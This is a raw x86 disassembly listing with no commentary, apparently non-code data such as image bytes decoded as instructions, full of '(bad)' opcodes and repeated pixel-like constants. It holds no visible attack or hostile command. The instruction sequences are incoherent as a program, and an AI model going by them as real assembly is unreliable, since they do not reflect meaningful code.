  413870:	fsub   QWORD PTR [ebp+0x50]
  413873:	dec    edi
  413875:	leave  
  413876:	(bad)  
  413877:	call   eax
  413879:	(bad)  
  41387b:	call   FWORD PTR [edi-0x65016262]
  413881:	call   0x0:0x3f9a
	...
  413894:	xchg   ebx,eax
  413895:	xchg   ebx,eax
  413896:	xchg   ebp,eax
  413897:	xchg   bh,cl
  413899:	enter  0xffc7,0xcc
  41389d:	(bad)
  4138a0:	mov    dl,0xb1
  4138a2:	scas   al,BYTE PTR es:[edi]
  4138a3:	(bad)  
  4138a4:	mov    ebx,0xc2ffbbba
  4138a9:	ret    0xffc3
  4138ac:	lods   al,BYTE PTR ds:[esi]
  4138ad:	stos   BYTE PTR es:[edi],al
  4138ae:	stos   DWORD PTR es:[edi],eax
  4138af:	jmp    FWORD PTR [edx-0x4f005556]
  4138b5:	mov    al,0xb0
  4138b7:	inc    eax
  4138b9:	rol    ecx,0xff
  4138bc:	mov    al,0xb6
  4138be:	mov    edx,0x1f2487ff
  4138c3:	call   DWORD PTR [ecx-0x6800ede4]
  4138c9:	cs daa 
  4138cb:	call   DWORD PTR [ebx-0x6e00e1da]
  4138d1:	and    ebx,DWORD PTR [ebx]
  4138d3:	dec    DWORD PTR [esi-0x7000e8e1]
  4138d9:	pop    ds
  4138da:	push   ss
  4138db:	dec    DWORD PTR [edi-0x7000f7eb]
  4138e1:	or     eax,DWORD PTR [eax]
  4138e3:	call   DWORD PTR [ebp-0x6c00fff2]
  4138e9:	cmp    BYTE PTR [esi],ch
  4138eb:	(bad)  
  4138ec:	mov    ebp,0xd4ffadaf
  4138f1:	aam    0xd4
  4138f3:	dec    ecx
  4138f5:	leave  
  4138f6:	leave  
  4138f7:	inc    edx
  4138f9:	ret    0xffc2
  4138fc:	enter  0xc5c5,0xff
  413900:	xchg   BYTE PTR [edi],dh
  413902:	sub    edi,edi
  413904:	shl    DWORD PTR [eax+0x4e],1
  413907:	call   esi
  413909:	ins    DWORD PTR es:[edi],dx
  41390a:	pop    ebx
  41390b:	(bad)  
  41390c:	fldcw  WORD PTR [ebx+0x58]
  41390f:	(bad)  
  413910:	fld    TBYTE PTR [ebp+0x5a]
  413913:	(bad)  
  413914:	fisubr WORD PTR [esi+0x5b]
  413917:	jmp    eax
  413919:	jo     0x413978
  41391b:	jmp    ebx
  41391d:	jno    0x41397c
  41391f:	jmp    ebp
  413921:	jae    0x413981
  413923:	jmp    esi
  413925:	je     0x413986
  413927:	jmp    edi
  413929:	js     0x41398e
  41392b:	(bad)  
  41392c:	call   0xe540919f
  413931:	push   0x54
  413933:	call   edx
  413935:	(bad)
  413938:	aad    0xdd
  41393a:	(bad)  
  41393c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41393d:	mov    ds:0x9999ffa2,al
  413942:	cdq    
  413943:	push   0x0
	...
  413954:	xchg   ebx,eax
  413955:	xchg   edx,eax
  413956:	xchg   esi,eax
  413957:	xchg   ah,cl
  413959:	(bad)  
  41395a:	enter  0xc6ff,0xbe
  41395e:	sar    bh,0xa5
  413961:	mov    ds:0xb6b9ffa0,eax
  413966:	mov    bh,0xff
  413968:	mov    ah,0xc7
  41396b:	push   DWORD PTR [ecx-0x4d004f51]
  413971:	mov    bl,0xb2
  413973:	(bad)  
  413974:	mov    ecx,0xc3ffb9b9
  413979:	ret    
  41397a:	ret    
  41397b:	push   DWORD PTR [esi-0x71003b41]
  413981:	ds cmp edi,edi
  413984:	xchg   ecx,eax
  413985:	sbb    edx,DWORD PTR [ecx]
  413987:	call   FWORD PTR [eax+edi*1+0x2f97ff31]
  41398e:	sub    bh,bh
  413990:	xchg   ebp,eax
  413991:	sub    esp,DWORD PTR ds:0x212994ff
  413997:	call   DWORD PTR [esi-0x6e00e2d8]
  41399d:	adc    BYTE PTR [edi+edi*8],al
  4139a0:	(bad)  
  4139a1:	or     eax,0x3085ff00
  4139a6:	daa    
  4139a7:	dec    edx
  4139a9:	mov    esp,0xececffbb
  4139ae:	in     al,dx
  4139af:	(bad)  
  4139b0:	(bad)  
  4139b2:	aam    0xff
  4139b4:	mov    bh,0x94
  4139b6:	nop
  4139b7:	inc    ebp
  4139b9:	mov    edx,0xdedeffb8
  4139be:	fdivp  st(7),st
  4139c0:	mov    dl,0xa1
  4139c2:	lahf   
  4139c3:	push   DWORD PTR [edx-0x2200aea0]
  4139c9:	jns    0x413a34
  4139cb:	(bad)  
  4139cc:	fbstp  TBYTE PTR [edi+0x66]
  4139cf:	jmp    edx
  4139d1:	jns    0x413a3a
  4139d3:	jmp    esi
  4139d5:	jnp    0x413a3f
  4139d7:	jmp    esi
  4139d9:	jl     0x413a44
  4139db:	(bad)  
  4139dc:	call   0xeb40a45e
  4139e1:	jg     0x413a4e
  4139e3:	(bad)  
  4139e4:	jmp    0x413966
  4139e6:	ins    BYTE PTR es:[edi],dx
  4139e7:	(bad)  
  4139e8:	in     al,dx
  4139e9:	sub    BYTE PTR [ebp-0x1],0xf0
  4139ed:	sub    BYTE PTR [ebx-0x1],0xea
  4139f1:	ins    DWORD PTR es:[edi],dx
  4139f2:	push   ebp
  4139f3:	call   edx
  4139f5:	mov    esp,0xdfd5ffb7
  4139fa:	loope  0x4139fb
  4139fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139ff:	call   FWORD PTR [ecx+0x8b9999]
	...
  413a11:	add    BYTE PTR [eax],al
  413a13:	add    BYTE PTR [edx+edx*4-0x3f39796c],dl
  413a1a:	sar    bh,0xbe
  413a1d:	mov    ebx,0x9fa3ffbb
  413a22:	lahf   
  413a23:	push   DWORD PTR [esi-0x36004a4c]
  413a29:	retf   
  413a2a:	leave  
  413a2b:	(bad)  
  413a2c:	mov    ecx,0xb9ffb9bb
  413a31:	mov    ecx,0xbcbcffb9
  413a36:	mov    esp,0xc7c6c6ff
  413a3b:	(bad)  
  413a3c:	mov    ecx,0x99ffc7c3
  413a41:	push   esi
  413a42:	push   edx
  413a43:	call   DWORD PTR [ecx-0x5c00eee6]
  413a49:	inc    esp
  413a4a:	cmp    eax,0x32379cff
  413a4f:	call   FWORD PTR [edx-0x6200d0ca]
  413a55:	cmp    BYTE PTR [edi],ch
  413a57:	call   FWORD PTR [ebx-0x7500e5da]
  413a5d:	push   cs
  413a5e:	add    edi,edi
  413a60:	cmp    DWORD PTR ds:0xd4daff36,0xffffffd3
  413a6a:	(bad)  
  413a6b:	(bad)  
  413a6c:	out    dx,al
  413a6d:	out    dx,al
  413a6e:	out    dx,al
  413a6f:	call   FWORD PTR [edi-0x5300a69e]
  413a75:	and    BYTE PTR [edi+edi*8],cl
  413a78:	mov    bl,0x77
  413a7a:	outs   dx,BYTE PTR ds:[esi]
  413a7b:	jmp    eax
  413a7d:	loopne 0x413a5f
  413a7f:	(bad)  
  413a80:	out    dx,al
  413a81:	out    dx,al
  413a82:	out    dx,al
  413a83:	jmp    DWORD PTR [eax-0x28008581]
  413a89:	jg     0x413afb
  413a8b:	jmp    ebp
  413a8d:	test   BYTE PTR [ebx-0x1],dh
  413a90:	jmp    0xeb40b01b
  413a95:	xchg   DWORD PTR [ebp-0x1],esi
  413a98:	in     al,dx
  413a99:	mov    DWORD PTR [edi-0x1],esi
  413a9c:	out    dx,al
  413a9d:	mov    bh,BYTE PTR [eax-0x1]
  413aa0:	lock mov edi,DWORD PTR [ecx-0x1]
  413aa4:	icebp  
  413aa5:	lea    edi,[edx-0x1]
  413aa8:	repnz (bad) 
  413aaa:	jl     0x413aab
  413aac:	not    BYTE PTR [ecx+0x74f3ff7d]
  413ab2:	pop    ebp
  413ab3:	(bad)  
  413ab4:	fdiv   DWORD PTR [edx-0x1d2a0056]
  413aba:	in     al,0xff
  413abc:	test   eax,0x96ffaaaa
  413ac1:	xchg   esi,eax
  413ac2:	xchg   esi,eax
  413ac3:	mov    bl,0x0
	...
  413ad1:	add    BYTE PTR [eax],al
  413ad3:	add    BYTE PTR [edx-0x43796a6d],dl
  413ad9:	mov    eax,0xb2bbffba
  413ade:	mov    ah,0xff
  413ae0:	mov    eax,ds:0xb4ff9a99
  413ae5:	mov    dl,0xb4
  413ae7:	dec    esp
  413ae9:	int    0xcf
  413aeb:	(bad)  
  413aec:	mov    esi,0xbdffbec0
  413af1:	mov    ebp,0xbfbfffbd
  413af6:	mov    edi,0xc6c6c6ff
  413afb:	(bad)  
  413afc:	mov    edx,0x97ffc7c4
  413b01:	call   WORD PTR gs:[ecx-0x5700ede6]
  413b09:	push   eax
  413b0a:	dec    eax
  413b0b:	jmp    DWORD PTR [ecx-0x5e00c2be]
  413b11:	inc    edx
  413b12:	cmp    edi,edi
  413b14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b15:	inc    edx
  413b16:	cmp    bh,bh
  413b18:	xchg   ebp,eax
  413b19:	pop    ss
  413b1a:	or     bh,bh
  413b1c:	(bad)  
  413b1d:	and    bl,BYTE PTR [edx]
  413b1f:	dec    ecx
  413b21:	mov    eax,0xffffffb6
  413b26:	(bad)  
  413b27:	(bad)  
  413b28:	jmp    0xaa412214
  413b2d:	push   0x61
  413b2f:	jmp    FWORD PTR [ecx-0x4600fae6]
  413b35:	sbb    BYTE PTR [eax],al
  413b37:	push   DWORD PTR [eax-0x2e00e4d2]
  413b3d:	mov    edi,0xf2f2ffbd
  413b42:	bnd jmp edx
  413b45:	loope  0x413b28
  413b47:	jmp    FWORD PTR [eax-0x1400968e]
  413b4d:	xchg   edx,eax
  413b4e:	cmp    edi,0xff8393ee
  413b54:	out    dx,eax
  413b55:	xchg   ebp,eax
  413b56:	test   bh,bh
  413b58:	icebp  
  413b59:	xchg   esi,eax
  413b5a:	test   edi,edi
  413b5c:	repz xchg edi,eax
  413b5e:	xchg   bh,bh
  413b60:	cmc    
  413b61:	cwde   
  413b62:	xchg   edi,edi
  413b64:	cmc    
  413b65:	cdq    
  413b66:	mov    bh,bh
  413b68:	neg    BYTE PTR [edx-0x5f060077]
  413b6e:	mov    ?,edi
  413b70:	stc    
  413b71:	sub    BYTE PTR [edx-0x1],0xdb
  413b75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b76:	call   0xb5ff:0xe4e2d8ff
  413b7d:	mov    ch,0xb5
  413b7f:	call   DWORD PTR [edi+0xc99797]
	...
  413b91:	add    BYTE PTR [eax],al
  413b93:	add    BYTE PTR [ebx-0x43796a6e],dl
  413b99:	scas   al,BYTE PTR es:[edi]
  413b9a:	mov    ah,0xff
  413b9c:	ret    
  413b9d:	stos   BYTE PTR es:[edi],al
  413b9e:	mov    dl,0xff
  413ba0:	test   eax,0xb3ffa09c
  413ba5:	mov    cl,0xb6
  413ba7:	dec    ebp
  413ba9:	iret   
  413baa:	iret   
  413bab:	inc    ebx
  413bad:	(bad)  
  413bb1:	ret    0xffc2
  413bb4:	(bad)  
  413bb5:	(bad)  
  413bb6:	(bad)  
  413bb7:	inc    esi
  413bb9:	mov    dh,0xff
  413bbc:	mov    esi,0x9cffc8c6
  413bc1:	jg     0x413b43
  413bc3:	dec    DWORD PTR [edi-0x5200e8e2]
  413bc9:	pop    eax
  413bca:	push   ecx
  413bcb:	jmp    DWORD PTR [ebp-0x5400b8b4]
  413bd1:	push   ecx
  413bd2:	dec    ecx
  413bd3:	jmp    DWORD PTR [esi-0x6d00cdc4]
  413bd9:	or     eax,DWORD PTR [eax]
  413bdb:	call   DWORD PTR [edi-0x6600fbee]
  413be1:	inc    ecx
  413be2:	push   DWORD PTR ss:[esi-0x62007f79]
  413be9:	inc    ebx
  413bea:	jmp    FWORD PTR ss:[esi-0x4800fae6]
  413bf1:	sbb    BYTE PTR [eax],al
  413bf3:	(bad)  
  413bf4:	mov    esi,0xc4ff001b
  413bf9:	sbb    al,BYTE PTR [eax]
  413bfb:	push   DWORD PTR [ecx-0x1700aea4]
  413c01:	call   0xfe3f3bee
  413c06:	std    
  413c07:	(bad)  
  413c08:	mov    esi,0xcdffb0b2
  413c0d:	mov    BYTE PTR [ebx-0x1],bh
  413c10:	icebp  
  413c11:	sahf   
  413c12:	mov    ?,edi
  413c14:	repz mov al,ds:0xa1f5ff90
  413c1a:	nop
  413c1b:	push   edi
  413c1d:	mov    ds:0xa3f8ff91,al
  413c22:	xchg   edx,eax
  413c23:	(bad)  
  413c24:	stc    
  413c25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c26:	xchg   ebx,eax
  413c27:	(bad)  
  413c28:	cli    
  413c29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c2a:	xchg   esp,eax
  413c2b:	(bad)  
  413c2c:	sti    
  413c2d:	stos   DWORD PTR es:[edi],eax
  413c2e:	fwait
  413c2f:	(bad)  
  413c30:	dec    DWORD PTR [edi-0x621c0087]
  413c36:	(bad)  
  413c37:	(bad)  
  413c38:	fcomp  st(7)
  413c3a:	loop   0x413c3b
  413c3c:	mov    esi,0x96ffc0c0
  413c41:	xchg   esi,eax
  413c42:	xchg   esi,eax
  413c43:	aad    0x0
	...
  413c51:	add    BYTE PTR [eax],al
  413c53:	add    BYTE PTR [esp+ecx*4-0x566a796a],bl
  413c5a:	popf   
  413c5b:	jmp    DWORD PTR [ecx-0x25]
  413c5e:	pushf  
  413c5f:	call   DWORD PTR [ecx-0x3c005845]
  413c65:	lods   al,BYTE PTR ds:[esi]
  413c66:	mov    eax,0xd1d1d0ff
  413c6b:	inc    edi
  413c6d:	mov    edi,0xc6c6c6ff
  413c73:	inc    edi
  413c75:	mov    edi,0xc9c9c9ff
  413c7b:	inc    edx
  413c7d:	(bad)  
  413c7e:	retf   0xa9ff
  413c81:	call   0xff1d:0x268dff9a
  413c88:	scas   eax,DWORD PTR es:[edi]
  413c89:	pop    ebx
  413c8a:	push   ebp
  413c8b:	jmp    FWORD PTR [ecx+ebx*2+0x5db2ff51]
  413c92:	push   esp
  413c93:	call   FWORD PTR [ebp-0x6c00e4d7]
  413c99:	or     DWORD PTR [eax],eax
  413c9b:	call   FWORD PTR [ebp-0x5a00ffef]
  413ca1:	adc    eax,DWORD PTR [eax]
  413ca3:	jmp    FWORD PTR [ecx-0x5100f9e6]
  413ca9:	push   ss
  413caa:	add    bh,bh
  413cac:	mov    ch,0x18
  413cae:	add    bh,bh
  413cb0:	mov    ebx,0xc3ff0019
  413cb5:	sbb    eax,DWORD PTR [eax]
  413cb7:	inc    edi
  413cb9:	sbb    BYTE PTR [eax],al
  413cbb:	inc    edx
  413cbd:	and    ecx,DWORD PTR [ecx]
  413cbf:	dec    edx
  413cc1:	scas   eax,DWORD PTR es:[edi]
  413cc2:	stos   BYTE PTR es:[edi],al
  413cc3:	push   edx
  413cc5:	repnz repnz (bad) 
  413cc8:	sti    
  413cc9:	sti    
  413cca:	sti    
  413ccb:	jmp    FWORD PTR [ecx-0x12007773]
  413cd1:	mov    ds:0xa9f7ff95,al
  413cd6:	call   0xf9ff:0x9babf9ff
  413cdd:	lods   al,BYTE PTR ds:[esi]
  413cde:	pushf  
  413cdf:	(bad)  
  413ce0:	sti    
  413ce1:	lods   eax,DWORD PTR ds:[esi]
  413ce2:	sahf   
  413ce3:	(bad)  
  413ce4:	cld    
  413ce5:	scas   al,BYTE PTR es:[edi]
  413ce6:	sahf   
  413ce7:	(bad)  
  413ce8:	std    
  413ce9:	scas   al,BYTE PTR es:[edi]
  413cea:	lahf   
  413ceb:	(bad)  
  413cec:	(bad)  
  413ced:	mov    ch,0xa5
  413cef:	(bad)  
  413cf0:	call   FWORD PTR [ebp-0x60120077]
  413cf6:	nop
  413cf7:	(bad)  
  413cf8:	fchs   
  413cfa:	loopne 0x413cfb
  413cfc:	ret    
  413cfd:	mov    bh,0xff
  413d00:	xchg   esi,eax
  413d01:	xchg   ebp,eax
  413d02:	xchg   ebp,eax
  413d03:	in     al,0x0
	...
  413d11:	add    BYTE PTR [eax],al
  413d13:	add    BYTE PTR [edi+0x347d9a8b],bl
  413d19:	int    0x7e
  413d1b:	inc    DWORD PTR [eax]
  413d1d:	jmp    FWORD PTR [ebx-0x1]
  413d20:	je     0x413cd9
  413d22:	fwait
  413d23:	dec    edx
  413d25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d26:	mov    edx,0xd3d3d3ff
  413d2b:	dec    ebx
  413d2d:	retf   
  413d2e:	retf   
  413d2f:	dec    ecx
  413d31:	leave  
  413d32:	leave  
  413d33:	dec    ebx
  413d35:	retf   
  413d36:	retf   
  413d37:	dec    ebx
  413d39:	retf   
  413d3a:	retf   
  413d3b:	dec    edx
  413d3d:	int    0xcf
  413d3f:	push   DWORD PTR [edx-0x6e005052]
  413d45:	xor    BYTE PTR [edx],ch
  413d47:	push   DWORD PTR [ecx-0x4b00aaa6]
  413d4d:	addr16 pop edi
  413d4f:	push   DWORD PTR [ebp-0x6800a9a1]
  413d55:	push   ss
  413d56:	or     bh,bh
  413d58:	cwde   
  413d59:	or     al,BYTE PTR [eax]
  413d5b:	jmp    DWORD PTR [ecx-0x5800ffee]
  413d61:	adc    al,0x0
  413d63:	jmp    FWORD PTR [ebp+edx*1+0x16b2ff00]
  413d6a:	add    bh,bh
  413d6c:	mov    bh,0x18
  413d6e:	add    bh,bh
  413d70:	mov    esi,0xc4ff001a
  413d75:	sbb    al,0x0
  413d77:	dec    ecx
  413d79:	pop    ss
  413d7a:	add    bh,bh
  413d7c:	shl    BYTE PTR [edi],cl
  413d7e:	or     bh,bh
  413d80:	ret    0x7481
  413d83:	(bad)  
  413d84:	fcom   st(3)
  413d86:	sar    edi,cl
  413d88:	cmc    
  413d89:	cmc    
  413d8a:	cmc    
  413d8b:	(bad)  
  413d8c:	in     al,dx
  413d8d:	jmp    0x413d7a
  413d8f:	jmp    FWORD PTR [ebp-0x600837d]
  413d95:	mov    bl,0xa5
  413d97:	(bad)  
  413d98:	sti    
  413d99:	mov    ah,0xa5
  413d9b:	(bad)  
  413d9c:	cld    
  413d9d:	mov    dh,0xa7
  413d9f:	(bad)  
  413da0:	(bad)  
  413da1:	mov    bh,0xa7
  413da3:	(bad)  
  413da4:	(bad)  
  413da5:	mov    eax,0xb7ffffa8
  413daa:	test   eax,0xafbdffff
  413daf:	(bad)  
  413db0:	jmp    FWORD PTR [ebp-0x5e110066]
  413db6:	(bad)  
  413db7:	(bad)  
  413db8:	fcmovnu st,st(6)
  413dba:	fdivp  st(7),st
  413dbc:	enter  0xcdcb,0xff
  413dc0:	xchg   ebp,eax
  413dc1:	xchg   ebp,eax
  413dc2:	xchg   ebp,eax
  413dc3:	lock fwait
  413dc5:	fwait
  413dc6:	fwait
  413dc7:	and    BYTE PTR [eax],al
	...
  413dd1:	add    BYTE PTR [eax],al
  413dd3:	add    BYTE PTR [edx+0x3e6e9f9a],bl
  413dd9:	xchg   esp,eax
  413dda:	inc    DWORD PTR ds:0x1b54
  413ddf:	(bad)  
  413de0:	jge    0x413e54
  413de2:	je     0x413de3
  413de4:	ret    
  413de5:	mov    edx,0xd8d5ffc3
  413dea:	fcos   
  413dec:	iret   
  413ded:	iret   
  413dee:	iret   
  413def:	dec    esp
  413df1:	int3   
  413df2:	int3   
  413df3:	dec    ebp
  413df5:	int    0xcd
  413df7:	dec    esi
  413df9:	into   
  413dfa:	into   
  413dfb:	call   eax
  413dfd:	rcl    esp,cl
  413dff:	(bad)  
  413e00:	mov    esp,0x96ffbbb8
  413e05:	cmp    dh,BYTE PTR [edi+edi*8]
  413e08:	mov    cl,0x5c
  413e0a:	push   ebp
  413e0b:	(bad)  
  413e0c:	mov    esi,0xacff727a
  413e11:	dec    esp
  413e12:	inc    edx
  413e13:	call   DWORD PTR [ebp-0x6100fff7]
  413e19:	(bad)  
  413e1b:	jmp    DWORD PTR [ebp-0x5600ffed]
  413e21:	adc    al,0x0
  413e23:	push   DWORD PTR [eax-0x4700ffea]
  413e29:	sbb    DWORD PTR [eax],eax
  413e2b:	inc    ebx
  413e2d:	sbb    eax,DWORD PTR [eax]
  413e2f:	dec    ebx
  413e31:	push   ds
  413e32:	add    bh,bh
  413e34:	rcr    DWORD PTR [edi],cl
  413e36:	add    bh,bh
  413e38:	ficom  DWORD PTR [edi]
  413e3a:	add    bh,bh
  413e3c:	out    0x3d,al
  413e3e:	sbb    eax,0x99aaf7ff
  413e43:	(bad)  
  413e44:	mov    edi,0xd7ff9ba2
  413e49:	xlat   BYTE PTR ds:[ebx]
  413e4a:	xlat   BYTE PTR ds:[ebx]
  413e4b:	(bad)  
  413e4c:	out    dx,eax
  413e4d:	out    dx,eax
  413e4e:	out    dx,eax
  413e4f:	inc    esi
  413e51:	mov    edi,0x9dcdffbd
  413e56:	xchg   ecx,eax
  413e57:	(bad)  
  413e58:	inc    edx
  413e5a:	mov    cl,0xff
  413e5c:	inc    ebx
  413e5e:	mov    bl,0xff
  413e60:	inc    ebp
  413e62:	mov    bl,0xff
  413e64:	inc    esi
  413e66:	mov    ah,0xff
  413e68:	inc    edi
  413e6a:	mov    ch,0xff
  413e6c:	dec    edx
  413e6e:	mov    ecx,0xadc2ffff
  413e73:	push   ecx
  413e75:	test   eax,0xdadeff8f
  413e7a:	fcos   
  413e7c:	int    0xd1
  413e7e:	sar    edi,cl
  413e80:	xchg   esi,eax
  413e81:	xchg   esi,eax
  413e82:	xchg   esi,eax
  413e83:	cld    
  413e84:	fwait
  413e85:	fwait
  413e86:	fwait
  413e87:	dec    edx
	...
  413e94:	cdq    
  413e95:	xchg   edi,eax
  413e96:	pushf  
  413e97:	outs   dx,BYTE PTR ds:[esi]
  413e98:	arpl   WORD PTR [ebp+edx*2-0x1],ax
  413e9c:	daa    
  413e9d:	add    BYTE PTR [edx],al
  413e9f:	(bad)  
  413ea0:	jl     0x413f0f
  413ea2:	ins    BYTE PTR es:[edi],dx
  413ea3:	(bad)  
  413ea4:	mov    ebp,0xd5ffc1c0
  413ea9:	(bad)  
  413eaa:	xlat   BYTE PTR ds:[ebx]
  413eab:	call   eax
  413ead:	rcl    al,1
  413eaf:	dec    edi
  413eb1:	iret   
  413eb2:	iret   
  413eb3:	call   ecx
  413eb5:	rcl    ecx,1
  413eb7:	call   edx
  413eb9:	rcl    dl,cl
  413ebb:	call   esi
  413ebd:	xlat   BYTE PTR ds:[ebx]
  413ebe:	fdivr  st,st(7)
  413ec0:	mov    ebx,0x95ffbcbb
  413ec5:	cmp    al,0x34
  413ec7:	push   DWORD PTR [edi+ebx*2-0x7f3b00a7]
  413ece:	jp     0x413ecf
  413ed0:	lahf   
  413ed1:	sub    bl,BYTE PTR ds:0x799ff
  413ed7:	jmp    DWORD PTR [esi-0x5100ffee]
  413edd:	adc    eax,0x18b6ff00
  413ee2:	add    bh,bh
  413ee4:	ret    0x1b
  413ee7:	dec    edx
  413ee9:	push   ds
  413eea:	add    bh,bh
  413eec:	shl    BYTE PTR [eax],cl
  413eee:	add    bh,bh
  413ef0:	(bad)  [edx]
  413ef2:	add    bh,bh
  413ef4:	loop   0x413f18
  413ef6:	add    bh,bh
  413ef8:	call   0xf5403f18
  413efd:	pop    ecx
  413efe:	aaa    
  413eff:	(bad)  
  413f00:	std    
  413f01:	mov    edi,0xc4f5ffb3
  413f06:	mov    ecx,0xaaaec1ff
  413f0b:	dec    edi
  413f0d:	iret   
  413f0e:	iret   
  413f0f:	jmp    eax
  413f11:	loopne 0x413ef3
  413f13:	jmp    FWORD PTR [ecx-0x17006663]
  413f19:	mov    edx,0xccffffab
  413f1e:	mov    esp,0xbdceffff
  413f23:	(bad)  
  413f24:	dec    edi
  413f26:	mov    esi,0xbed0ffff
  413f2b:	(bad)  
  413f2c:	call   esp
  413f2e:	ret    0xffff
  413f31:	sar    DWORD PTR [edi+edi*8-0x70520a],1
  413f38:	(bad)  
  413f3a:	sar    edi,1
  413f3c:	rcl    edi,cl
  413f3e:	fcos   
  413f40:	cwde   
  413f41:	xchg   edi,eax
  413f42:	xchg   edi,eax
  413f43:	call   FWORD PTR [edx+0x719a9a]
	...
  413f51:	add    BYTE PTR [eax],al
  413f53:	add    BYTE PTR [esi+0x6879a19d],bl
  413f59:	fs call DWORD PTR gs:[ebx+ecx*2+0x43]
  413f5f:	inc    DWORD PTR [edi-0x52008080]
  413f65:	scas   al,BYTE PTR es:[edi]
  413f66:	mov    cl,0xff
  413f68:	loope  0x413f4b
  413f6a:	loop   0x413f6b
  413f6c:	iret   
  413f6d:	iret   
  413f6e:	iret   
  413f6f:	dec    eax
  413f71:	enter  0xffc8,0xce
  413f75:	into   
  413f76:	into   
  413f77:	call   edx
  413f79:	rcl    dl,cl
  413f7b:	(bad)  
  413f7c:	fcmovnu st,st(3)
  413f7e:	(bad)  
  413f80:	mov    ebx,0x8fffc1c0
  413f85:	ds cmp edi,edi
  413f88:	mov    ecx,0xbfff5d65
  413f8d:	jb     0x413ff8
  413f8f:	call   FWORD PTR [eax+edx*1+0xfa5ff04]
  413f96:	add    bh,bh
  413f98:	lods   eax,DWORD PTR ds:[esi]
  413f99:	adc    eax,0x17b5ff00
  413f9e:	add    bh,bh
  413fa0:	mov    esi,0xc6ff001a
  413fa5:	sbb    al,0x0
  413fa7:	dec    ebp
  413fa9:	push   ds
  413faa:	add    bh,bh
  413fac:	aam    0x21
  413fae:	add    bh,bh
  413fb0:	(bad)  [ebx]
  413fb2:	add    bh,bh
  413fb4:	jecxz  0x413fd8
  413fb6:	add    bh,bh
  413fb8:	jmp    0x413fd9
  413fba:	add    bh,bh
  413fbc:	div    BYTE PTR [edx+0x56]
  413fbf:	(bad)  
  413fc0:	dec    dh
  413fc2:	(bad)  
  413fc3:	(bad)  
  413fc4:	dec    esi
  413fc6:	(bad)  
  413fc9:	shl    DWORD PTR [edi-0x4f4d4401],0xff
  413fd0:	leave  
  413fd1:	leave  
  413fd2:	leave  
  413fd3:	(bad)  
  413fd4:	fcomp  st(0)
  413fd6:	fdivr  st,st(7)
  413fd8:	mov    al,ds:0xf5ff8a90
  413fdd:	int3   
  413fde:	mov    ebp,0xc5d5ffff
  413fe3:	(bad)  
  413fe4:	call   esi
  413fe6:	(bad)  
  413fe9:	(bad)  
  413fea:	(bad)  
  413feb:	(bad)  
  413fec:	(bad)  
  413fed:	fmul   st,st(1)
  413fef:	(bad)  
  413ff0:	(bad)  
  413ff1:	fcmove st,st(2)
  413ff3:	(bad)  
  413ff4:	sti    
  413ff5:	mov    bl,0x95
  413ff7:	(bad)  
  413ff8:	(bad)  
  413ffa:	(bad)  
  413ffb:	(bad)  
  413ffc:	fsubr  st(0),st
  413ffe:	loop   0x413fff
  414000:	call   0x9999:0x99ff9b9b
  414007:	mov    eax,DWORD PTR [eax]
	...
  414011:	add    BYTE PTR [eax],al
  414013:	add    BYTE PTR [ebp-0x6fc55a5e],ah
  414019:	xchg   ecx,eax
  41401a:	(bad)  
  41401b:	call   DWORD PTR [edx-0x61006e6c]
  414021:	cdq    
  414022:	pushf  
  414023:	(bad)  
  414024:	fcmovu st,st(0)
  414026:	(bad)  
  414028:	(bad)  
  414029:	(bad)  
  41402a:	(bad)  
  41402b:	(bad)  
  41402c:	clc    
  41402d:	clc    
  41402e:	clc    
  41402f:	jmp    ebp
  414031:	in     eax,0xe5
  414033:	(bad)  
  414034:	(bad)  
  414036:	fcos   
  414038:	rcl    ebx,cl
  41403a:	sar    edi,cl
  41403c:	rcl    ebx,cl
  41403e:	sar    edi,cl
  414040:	ror    al,0xc9
  414043:	call   DWORD PTR [ecx-0x4400b5b1]
  414049:	pusha  
  41404a:	push   edi
  41404b:	push   DWORD PTR [ecx+edx*2+0x69cff44]
  414052:	add    bh,bh
  414054:	test   al,0x13
  414056:	add    bh,bh
  414058:	scas   eax,DWORD PTR es:[edi]
  414059:	adc    eax,0x18b8ff00
  41405e:	add    bh,bh
  414060:	rcr    BYTE PTR [ebx],0x0
  414063:	inc    edi
  414065:	sbb    eax,0x20d0ff00
  41406a:	add    bh,bh
  41406c:	xlat   BYTE PTR ds:[ebx]
  41406d:	and    DWORD PTR [eax],eax
  41406f:	(bad)  
  414070:	fisub  WORD PTR [ebx]
  414072:	add    bh,bh
  414074:	call   0xf0404097
  414079:	daa    
  41407a:	add    edi,edi
  41407c:	cli    
  41407d:	xchg   ecx,eax
  41407e:	jnp    0x41407f
  414080:	(bad)  
  414081:	fcmovnbe st,st(4)
  414083:	(bad)  
  414084:	call   ebp
  414086:	retf   
  414087:	(bad)  
  414088:	call   esp
  41408a:	leave  
  41408b:	call   esi
  41408d:	mov    bh,0xae
  41408f:	push   DWORD PTR [edi-0x39004c4c]
  414095:	mov    dh,0xff
  414098:	retf   
  414099:	retf   
  41409a:	retf   
  41409b:	jmp    DWORD PTR [esi-0x600726c]
  4140a1:	(bad)  
  4140a2:	(bad)  
  4140a3:	(bad)  
  4140a4:	(bad)  
  4140a5:	fmul   st(5),st
  4140a7:	(bad)  
  4140a8:	(bad)  
  4140a9:	fmul   st(6),st
  4140ab:	(bad)  
  4140ac:	(bad)  
  4140ad:	(bad)  
  4140af:	(bad)  
  4140b0:	jmp    esp
  4140b2:	xlat   BYTE PTR ds:[ebx]
  4140b3:	(bad)  
  4140b4:	(bad)  
  4140b5:	mov    esi,0xc6e0ffa2
  4140ba:	mov    ebp,0xeae7e1ff
  4140bf:	jmp    DWORD PTR [eax-0x66005f60]
  4140c5:	cdq    
  4140c6:	cdq    
  4140c7:	sahf   
	...
  4140d8:	mov    ah,0xb4
  4140da:	mov    bl,0x41
  4140dc:	int3   
  4140dd:	into   
  4140de:	iret   
  4140df:	xchg   esi,eax
  4140e0:	mov    bl,0xb6
  4140e2:	mov    bh,0xf1
  4140e4:	aad    0xd5
  4140e6:	(bad)  
